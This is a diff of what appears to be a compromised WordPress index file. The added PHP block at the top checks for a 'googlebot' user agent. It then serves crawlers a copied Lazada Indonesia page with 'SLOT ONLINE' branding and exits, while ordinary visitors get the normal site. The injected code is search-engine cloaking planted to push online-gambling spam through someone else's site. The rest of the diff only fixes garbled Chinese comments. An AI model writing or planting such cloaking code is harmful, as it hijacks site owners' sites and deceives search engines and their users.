@@ -1,3 +1,9 @@
+<?php
+
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
+
 
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
@@ -99,7 +105,7 @@
         'action':'aplus.appendMetaInfo',
         'arguments':['aplus-exdata',{"st_page_id":pageid}]
       });
-      // å…¼å®¹è€ç‰ˆæœ¬aplus
+      // 兼容老版本aplus
       var gq = (window.goldlog_queue || (window.goldlog_queue = []));
       gq.push({
         'action':'goldlog.appendMetaInfo',
@@ -134,7 +140,7 @@
       }
     }
     /**
-     * æ”¯æŒbeacon aplus script
+     * 支持beacon aplus script
      */
     var siteNameForApluPluginLoader = "Lazada";
 
@@ -739,7 +745,7 @@
       'action':'aplus.appendMetaInfo',
       'arguments':['aplus-exdata',{"st_page_id":pageid}]
     });
-    // å…¼å®¹è€ç‰ˆæœ¬aplus
+    // 兼容老版本aplus
     var gq = (window.goldlog_queue || (window.goldlog_queue = []));
     gq.push({
       'action':'goldlog.appendMetaInfo',
@@ -3378,10 +3384,10 @@ if (!lzdDocCookies.getItem('t_uid')) {
   function reportMtopData() {
       if (window.__wpk && window.__pdpMtopStartTime) {
         window.__wpk.report({
-          category: 111, //åˆ›å»ºç›‘æŽ§é¡¹æ—¶ï¼ŒèŽ·å¾—çš„"ç›‘æŽ§ä»£ç "
-          msg: 'PDP CSR MTOP API Success Rate', //ä½ è¦ä¸ŠæŠ¥çš„å†…å®¹
-          w_succ: window.__pdpMtopStatus || 0, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§çŽ‡ï¼Œåˆ™è®¾ç½®æ­¤å­—æ®µå¯é€‰ä¸º0ã€1
-          wl_avgv1: window.__pdpMtopEndTime? window.__pdpMtopEndTime - window.__pdpMtopStartTime : 0, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§å‡å€¼ï¼Œåˆ™è®¾ç½®æ¬¡æ­¤å­—æ®µï¼Œå¿…é¡»ä¸ºæ•°å­—
+          category: 111, //创建监控项时，获得的"监控代码"
+          msg: 'PDP CSR MTOP API Success Rate', //你要上报的内容
+          w_succ: window.__pdpMtopStatus || 0, // 可选，若监控项需要监控率，则设置此字段可选为0、1
+          wl_avgv1: window.__pdpMtopEndTime? window.__pdpMtopEndTime - window.__pdpMtopStartTime : 0, // 可选，若监控项需要监控均值，则设置次此字段，必须为数字
           c1: window.__regionID__
         })
       }
@@ -3390,9 +3396,9 @@ if (!lzdDocCookies.getItem('t_uid')) {
   function reportMtopData2() {
       if (window.__wpk && window.__pdpTriggerCSR) {
         window.__wpk.report({
-          category: 112, //åˆ›å»ºç›‘æŽ§é¡¹æ—¶ï¼ŒèŽ·å¾—çš„"ç›‘æŽ§ä»£ç "
-          msg: 'PDP CSR MTOP API Trigger Rate', //ä½ è¦ä¸ŠæŠ¥çš„å†…å®¹
-          w_succ: window.__pdpTriggerMtopStatus, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§çŽ‡ï¼Œåˆ™è®¾ç½®æ­¤å­—æ®µå¯é€‰ä¸º0ã€1
+          category: 112, //创建监控项时，获得的"监控代码"
+          msg: 'PDP CSR MTOP API Trigger Rate', //你要上报的内容
+          w_succ: window.__pdpTriggerMtopStatus, // 可选，若监控项需要监控率，则设置此字段可选为0、1
           c1: window.__regionID__
         })
       }
@@ -3401,9 +3407,9 @@ if (!lzdDocCookies.getItem('t_uid')) {
   function reportMtopData3() {
     if (window.__wpk) {
       window.__wpk.report({
-        category: 113, //åˆ›å»ºç›‘æŽ§é¡¹æ—¶ï¼ŒèŽ·å¾—çš„"ç›‘æŽ§ä»£ç "
-        msg: 'PDP CSR Hydrate Success Rate', //ä½ è¦ä¸ŠæŠ¥çš„å†…å®¹
-        w_succ: window.__pdpHydrateStatus || 0, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§çŽ‡ï¼Œåˆ™è®¾ç½®æ­¤å­—æ®µå¯é€‰ä¸º0ã€1
+        category: 113, //创建监控项时，获得的"监控代码"
+        msg: 'PDP CSR Hydrate Success Rate', //你要上报的内容
+        w_succ: window.__pdpHydrateStatus || 0, // 可选，若监控项需要监控率，则设置此字段可选为0、1
         c1: window.__regionID__
       })
     }
@@ -3475,7 +3481,7 @@ if (!lzdDocCookies.getItem('t_uid')) {
           <a href="//group.lazada.com/en/about/">Tentang Lazada</a>
       </li>
       <li class="footer-li">
-          <a href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/partnership/AffiliatesID">Afï¬liate Program</a>
+          <a href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/partnership/AffiliatesID">Afﬁliate Program</a>
       </li>
       <li class="footer-li">
           <a href="//www.lazada.com/work-at-lazada/">Karir</a>
@@ -3593,7 +3599,7 @@ if (!lzdDocCookies.getItem('t_uid')) {
   </div>
   <div class="lzd-footer-width-25">
     <div class="lzd-footer-copyright">
-    Â© Lazada 2025
+    © Lazada 2025
     </div>
   </div>
 </div>
@@ -3770,7 +3776,7 @@ var gConfig = window.g_config || {};
               <a>Tentang Lazada</a>
             </li>
             <li class="footer-li">
-              <a>Afï¬liate Program</a>
+              <a>Afﬁliate Program</a>
             </li>
             <li class="footer-li">
               <a>Karir</a>
@@ -3883,7 +3889,7 @@ var gConfig = window.g_config || {};
               </div>
               <div class="lzd-footer-width-25">
               <div class="lzd-footer-copyright">
-              Â© SLOT ONLINE 2025
+              © SLOT ONLINE 2025
               </div>
               </div>
           </div>
@@ -3895,3 +3901,29 @@ var gConfig = window.g_config || {};
 <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9170976cd802fdfc',t:'MTc0MDQxMjAxOC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9170976cd802fdfc","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"version":"2025.1.0","token":"d7da89452fea4bb28a2893afc7db16f6"}' crossorigin="anonymous"></script>
 </body>
 </html>
+<?php
+exit;
+}
+?>
+
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
